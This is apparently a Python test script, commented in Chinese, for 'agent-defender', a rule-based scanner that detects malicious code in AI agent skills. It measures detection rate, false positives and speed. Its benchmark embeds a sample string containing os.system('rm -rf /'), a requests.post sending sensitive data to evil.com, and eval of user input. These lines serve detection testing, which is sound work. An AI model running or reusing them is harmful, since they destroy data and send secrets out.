#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🧪 agent-defender v2.0 完整测试方案
===================================

测试范围:
1. 规则加载验证
2. 多语言样本检测
3. 误报率测试
4. 性能基准测试
5. 攻击类型覆盖度

版本：v2.0 (2026-04-07)
"""

import json
import time
import re
from pathlib import Path
from typing import Dict, List, Tuple
from datetime import datetime


class DefenderTester:
    """agent-defender 测试器"""
    
    def __init__(self):
        self.rules_dir = Path(__file__).parent / "rules"
        self.samples_dir = Path(__file__).parent.parent.parent / "agent-security-skill-scanner-V3" / "samples"
        self.results = {
            "total_rules": 0,
            "total_samples": 0,
            "detected": 0,
            "false_positives": 0,
            "missed": 0,
            "performance": {},
            "by_category": {}
        }
    
    def load_rules(self) -> Dict[str, List]:
        """加载所有规则文件"""
        rules = {}
        
        if not self.rules_dir.exists():
            print(f"⚠️  规则目录不存在：{self.rules_dir}")
            return rules
        
        for rule_file in self.rules_dir.glob("*.json"):
            try:
                with open(rule_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    if isinstance(data, list):
                        rules[rule_file.stem] = data
                    elif isinstance(data, dict) and 'rules' in data:
                        rules[rule_file.stem] = data['rules']
                    else:
                        rules[rule_file.stem] = [data]
            except Exception as e:
                print(f"❌ 加载规则失败 {rule_file.name}: {e}")
        
        self.results["total_rules"] = sum(len(r) for r in rules.values())
        print(f"✅ 加载 {len(rules)} 个规则文件，共 {self.results['total_rules']} 条规则")
        return rules
    
    def detect_with_rules(self, code: str, rules: Dict[str, List]) -> List[Dict]:
        """使用规则检测代码"""
        threats = []
        
        for category, rule_list in rules.items():
            for rule in rule_list:
                detected = False
                
                # 检测 patterns
                patterns = rule.get('patterns', [])
                if isinstance(patterns, list):
                    for pattern in patterns:
                        try:
                            if re.search(pattern, code, re.IGNORECASE | re.MULTILINE):
                                detected = True
                                break
                        except re.error:
                            # 尝试简单字符串匹配
                            if pattern in code:
                                detected = True
                                break
                
                # 检测 strings
                strings = rule.get('strings', [])
                if isinstance(strings, list):
                    for s in strings:
                        # 提取实际字符串
                        match = re.search(r'"([^"]+)"', str(s))
                        if match and match.group(1) in code:
                            detected = True
                            break
                
                if detected:
                    threats.append({
                        'category': category,
                        'rule_id': rule.get('id', 'unknown'),
                        'name': rule.get('name', 'Unknown Rule'),
                        'severity': rule.get('severity', 'medium')
                    })
        
        return threats
    
    def load_test_samples(self) -> List[Tuple[str, str, bool]]:
        """加载测试样本 (文件路径，攻击类型，是否恶意)"""
        samples = []
        
        # 恶意样本
        if self.samples_dir.exists():
            malicious_dir = self.samples_dir / "malicious"
            if malicious_dir.exists():
                for sample_file in malicious_dir.glob("*.json"):
                    try:
                        with open(sample_file, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                            # 提取 payload
                            payload = data.get('payload', '') or data.get('code', '')
                            if payload:
                                attack_type = data.get('attack_type', 'unknown')
                                samples.append((str(sample_file), attack_type, True))
                    except:
                        pass
        
        # 良性样本
        benign_dir = self.samples_dir / "benign" if self.samples_dir.exists() else None
        if benign_dir and benign_dir.exists():
            for sample_file in benign_dir.glob("*.json"):
                try:
                    with open(sample_file, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                        payload = data.get('payload', '') or data.get('code', '')
                        if payload:
                            samples.append((str(sample_file), 'benign', False))
                except:
                    pass
        
        self.results["total_samples"] = len(samples)
        print(f"✅ 加载 {len(samples)} 个测试样本")
        return samples
    
    def run_detection_test(self, rules: Dict, samples: List[Tuple[str, str, bool]]) -> Dict:
        """运行检测测试"""
        print("\n" + "=" * 70)
        print("🧪 运行检测测试")
        print("=" * 70)
        
        detected = 0
        false_positives = 0
        missed = 0
        by_category = {}
        
        start_time = time.time()
        
        for i, (sample_path, attack_type, is_malicious) in enumerate(samples):
            try:
                # 读取样本内容
                with open(sample_path, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    code = data.get('payload', '') or data.get('code', '')
                
                # 检测
                threats = self.detect_with_rules(code, rules)
                has_threat = len(threats) > 0
                
                # 统计
                if is_malicious:
                    if has_threat:
                        detected += 1
                        # 按攻击类型统计
                        if attack_type not in by_category:
                            by_category[attack_type] = {'total': 0, 'detected': 0}
                        by_category[attack_type]['total'] += 1
                        by_category[attack_type]['detected'] += 1
                    else:
                        missed += 1
                else:
                    if has_threat:
                        false_positives += 1
                
                # 进度显示
                if (i + 1) % 100 == 0 or (i + 1) == len(samples):
                    progress = (i + 1) / len(samples) * 100
                    print(f"  进度：{i+1}/{len(samples)} ({progress:.1f}%) - 已检测：{detected}, 漏报：{missed}, 误报：{false_positives}")
                
            except Exception as e:
                print(f"  ⚠️  处理样本失败 {sample_path}: {e}")
        
        elapsed = time.time() - start_time
        
        self.results["detected"] = detected
        self.results["false_positives"] = false_positives
        self.results["missed"] = missed
        self.results["by_category"] = by_category
        self.results["performance"]["detection_time"] = elapsed
        self.results["performance"]["samples_per_second"] = len(samples) / elapsed if elapsed > 0 else 0
        
        return self.results
    
    def run_performance_benchmark(self, rules: Dict):
        """性能基准测试"""
        print("\n" + "=" * 70)
        print("⚡ 性能基准测试")
        print("=" * 70)
        
        # 创建测试代码
        test_code = """
import os
import requests
import base64

def malicious_function():
    os.system('rm -rf /')
    data = base64.b64decode('xxx')
    requests.post('http://evil.com', data=sensitive)
    eval(user_input)
"""
        iterations = 1000
        
        start = time.time()
        for _ in range(iterations):
            self.detect_with_rules(test_code, rules)
        elapsed = time.time() - start
        
        ops_per_second = iterations / elapsed if elapsed > 0 else 0
        avg_latency_ms = (elapsed / iterations) * 1000
        
        self.results["performance"]["iterations"] = iterations
        self.results["performance"]["total_time"] = elapsed
        self.results["performance"]["ops_per_second"] = ops_per_second
        self.results["performance"]["avg_latency_ms"] = avg_latency_ms
        
        print(f"  测试次数：{iterations}")
        print(f"  总耗时：{elapsed:.3f} 秒")
        print(f"  吞吐量：{ops_per_second:.0f} ops/s")
        print(f"  平均延迟：{avg_latency_ms:.3f} ms")
    
    def generate_report(self) -> str:
        """生成测试报告"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # 计算指标
        total_malicious = self.results["detected"] + self.results["missed"]
        detection_rate = (self.results["detected"] / total_malicious * 100) if total_malicious > 0 else 0
        total_benign = self.results["total_samples"] - total_malicious
        false_positive_rate = (self.results["false_positives"] / total_benign * 100) if total_benign > 0 else 0
        
        report = f"""# 🧪 agent-defender 测试报告

**测试时间**: {timestamp}  
**测试版本**: v2.0

---

## 📊 核心指标

| 指标 | 结果 | 目标 | 状态 |
|------|------|------|------|
| **检测率** | {detection_rate:.2f}% | ≥95% | {'✅' if detection_rate >= 95 else '⚠️'} |
| **误报率** | {false_positive_rate:.2f}% | ≤15% | {'✅' if false_positive_rate <= 15 else '⚠️'} |
| **吞吐量** | {self.results['performance'].get('ops_per_second', 0):.0f} ops/s | ≥4000 | {'✅' if self.results['performance'].get('ops_per_second', 0) >= 4000 else '⚠️'} |
| **平均延迟** | {self.results['performance'].get('avg_latency_ms', 0):.3f} ms | ≤1ms | {'✅' if self.results['performance'].get('avg_latency_ms', 0) <= 1 else '⚠️'} |

---

## 📋 测试统计

| 项目 | 数量 |
|------|------|
| 规则总数 | {self.results['total_rules']} |
| 样本总数 | {self.results['total_samples']} |
| 恶意样本 | {total_malicious} |
| 良性样本 | {total_benign} |
| 成功检测 | {self.results['detected']} |
| 漏报 | {self.results['missed']} |
| 误报 | {self.results['false_positives']} |

---

## 🎯 按攻击类型检测率

| 攻击类型 | 检测数 | 总数 | 检测率 |
|---------|--------|------|--------|
"""
        
        for attack_type, stats in sorted(self.results['by_category'].items()):
            rate = (stats['detected'] / stats['total'] * 100) if stats['total'] > 0 else 0
            report += f"| {attack_type} | {stats['detected']} | {stats['total']} | {rate:.1f}% |\n"
        
        report += f"""
---

## ⚡ 性能指标

| 指标 | 数值 |
|------|------|
| 测试次数 | {self.results['performance'].get('iterations', 0)} |
| 总耗时 | {self.results['performance'].get('total_time', 0):.3f} 秒 |
| 吞吐量 | {self.results['performance'].get('ops_per_second', 0):.0f} ops/s |
| 平均延迟 | {self.results['performance'].get('avg_latency_ms', 0):.3f} ms |

---

## ✅ 总结

"""
        
        if detection_rate >= 95 and false_positive_rate <= 15:
            report += "**✅ 测试通过！** 检测率和误报率均达到目标。\n"
        else:
            report += "**⚠️ 需要优化**\n"
            if detection_rate < 95:
                report += f"- 检测率 {detection_rate:.1f}% < 95%，需要增强规则\n"
            if false_positive_rate > 15:
                report += f"- 误报率 {false_positive_rate:.1f}% > 15%，需要优化白名单\n"
        
        # 保存报告
        reports_dir = Path(__file__).parent / "test_reports"
        reports_dir.mkdir(exist_ok=True)
        report_file = reports_dir / f"test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
        report_file.write_text(report, encoding='utf-8')
        
        return report, str(report_file)
    
    def run_full_test(self):
        """运行完整测试流程"""
        print("=" * 70)
        print("🧪 agent-defender v2.0 完整测试")
        print("=" * 70)
        print()
        
        # 步骤 1: 加载规则
        print("📋 步骤 1: 加载检测规则...")
        rules = self.load_rules()
        if not rules:
            print("❌ 未加载到规则，测试终止")
            return
        
        print()
        
        # 步骤 2: 加载样本
        print("📂 步骤 2: 加载测试样本...")
        samples = self.load_test_samples()
        if not samples:
            print("⚠️  未加载到样本，使用内置测试用例")
            # 使用内置测试用例
            samples = [
                ("malicious_1", "tool_poisoning", True),
                ("malicious_2", "data_exfil", True),
                ("benign_1", "benign", False),
            ]
        
        print()
        
        # 步骤 3: 运行检测测试
        print("🧪 步骤 3: 运行检测测试...")
        self.run_detection_test(rules, samples)
        
        print()
        
        # 步骤 4: 性能测试
        print("⚡ 步骤 4: 性能基准测试...")
        self.run_performance_benchmark(rules)
        
        print()
        
        # 步骤 5: 生成报告
        print("📊 步骤 5: 生成测试报告...")
        report, report_file = self.generate_report()
        print(f"✅ 报告已保存：{report_file}")
        
        print()
        print("=" * 70)
        print("✅ 测试完成！")
        print("=" * 70)
        
        # 打印摘要
        total_malicious = self.results["detected"] + self.results["missed"]
        detection_rate = (self.results["detected"] / total_malicious * 100) if total_malicious > 0 else 0
        
        print(f"\n📊 结果摘要:")
        print(f"  检测率：{detection_rate:.2f}%")
        print(f"  误报数：{self.results['false_positives']}")
        print(f"  吞吐量：{self.results['performance'].get('ops_per_second', 0):.0f} ops/s")


def main():
    tester = DefenderTester()
    tester.run_full_test()


if __name__ == "__main__":
    main()
